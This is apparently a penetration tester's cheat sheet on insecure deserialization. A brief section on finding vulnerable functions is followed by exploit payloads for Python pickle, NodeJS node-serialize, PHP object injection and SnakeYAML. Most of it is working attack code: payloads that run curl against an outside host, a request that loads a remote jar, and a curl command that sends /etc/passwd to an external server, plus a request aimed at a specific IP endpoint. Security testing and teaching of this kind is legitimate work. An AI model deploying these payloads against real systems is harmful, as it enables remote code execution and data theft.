# Detection
- Search source code for deserialization functions and check if user input is being passed into it recklessly.
  - PHP: `unserialize()`
  - Java: `readObject()`
  - Python: `pickle.loads()`
  - Ruby: `Marshall.load()`
- Pay attention to the large blobs of data passed into an application.
  - If the data is encoded, try to decode it.
  - Java serialized objects often start with the hex characters `AC ED 00 05` or the characters `rO0` in base64.
- `Content-Type: application/x-java-serialized-object`  →  The application is passing information via Java serialized objects. 
 
# Exploit
### Python
- Use the base64-encoded output of this code, to inject instead of serialized data.
  - If there is `+` in payload, convert it to `%2b`, to be able to passed via URL.
  ```python
  import pickle
  import os
  import base64

  class EvilPickle(object):
      def __reduce__(self):
          return (os.system, ('curl cvefix.ir:8080', ))
  pickle_data = pickle.dumps(EvilPickle())
  with open("my.data", "wb") as file:
      file.write(base64.b64encode(pickle_data))
  ```

### NodeJS
- Code to generate paylaod:
  ```javascript
  var y = {
   rce : function(){
   require('child_process').exec('curl cvefix.ir:8080', function(error, stdout, stderr) { console.log(stdout) });
   },
  }
  var serialize = require('node-serialize');
  console.log("Serialized: \n" + serialize.serialize(y));
  ```
  ```bash
  node exp.js
  ```
- Add `()` at the end of the output of above code, then Base64-encode the paylaod and use it as input, instead of serialized data.

### PHP
- Find the source code (`rss.php`) from backup files:
  ```php
  <?php 
  error_reporting(E_ALL);
  class VulnerableClass{
      private $__TimexDEBUG;
      public $inject;
      function __construct(){}
      function __wakeup(){
          if(isset($this->__TimexDEBUG)){
              eval($this->inject);
          }
      }
  }
  ...
  ```
- Write a php code (`exploit.php`) to generate maliciuos object, based on the leaked source code.
  ```php
  <?php
  class VulnerableClass{
      private $__TimexDEBUG=true;
      public $inject="echo 'ehsan';";
  }
  echo urlencode(serialize(new VulnerableClass));
  ?>
  ```
  ```php
  php exploit.php
  # O%3A15%3A%22VulnerableClass%22%3A2%3A%7Bs%3A29%3A%22%00VulnerableClass%00__TimexDEBUG%22%3Bb%3A1%3Bs%3A6%3A%22inject%22%3Bs%3A13%3A%22echo+%27ehsan%27%3B%22%3B%7D
  ```
- Send the object to vulnerable endpoint
  ```bash
  http://77.238.121.150:37727/rss.php?__TimexDEBUG=O%3A15%3A%22VulnerableClass%22%3A2%3A{s%3A29%3A%22%00VulnerableClass%00__TimexDEBUG%22%3Bb%3A1%3Bs%3A6%3A%22inject%22%3Bs%3A13%3A%22echo+%27ehsan%27%3B%22%3B}r
  ```
- Another exploitation of a vulnerable code that create `/tmp/POC/SHELL` in victim server.
  ```php
  <?php
  class site{
      private $debug = 'true';
      public $filename = '/tmp/POC';
      public $name = 'SHELL';
  }
  
  print(base64_encode(serialize(new site)));
  ?>
  ```

### Java
- SnakeYaml vulnerability (_https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/_)
- Detection
  ```bash
  POST /update HTTP/1.1
  (Request Body)
  -----------------------------2011825832476402807620303023
  Content-Disposition: form-data; name="config"

  a: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://03aa-69-159-156-59.ngrok-free.app/test.jar"]]]]
  b: fdsklj
  -----------------------------2011825832476402807620303023--
  ```
- Exploitation
  ```bash
  POST /update HTTP/1.1
  (Request Body)
  -----------------------------2011825832476402807620303023
  Content-Disposition: form-data; name="config"

  a: !!com.lean.watersnake.GetWaterLevel ["curl http://cvefix.ir:8080 --data-binary @/etc/passwd "]
  b: fdsklj
  -----------------------------2011825832476402807620303023--
  ```
